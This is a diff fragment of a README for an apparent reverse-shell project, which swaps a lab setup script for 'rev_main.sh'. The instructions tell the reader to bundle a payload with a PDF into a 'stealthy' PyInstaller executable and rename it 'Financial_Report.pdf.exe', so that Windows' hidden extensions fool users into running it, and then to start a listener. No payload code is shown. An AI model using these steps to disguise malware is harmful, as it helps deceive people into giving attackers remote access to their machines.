@@ -15,7 +15,7 @@ listen.sh: A stylized UI for the Machine A controller.
 🚀 Execution Steps
 1. Environment Setup (Machine A)
 Run the setup script on your Linux machine to prepare the environment:
-chmod +x setup_lab.sh && ./setup_lab.sh
+chmod +x rev_main.sh && ./rev_main.sh
 2. Compiling the Payload
 Bundle the script and PDF into one stealthy executable using PyInstaller. Rename the output rev.exe to Financial_Report.pdf.exe. Windows typically hides the .exe extension, leaving only the PDF name and icon visible to the user.
 3. Starting the Listener
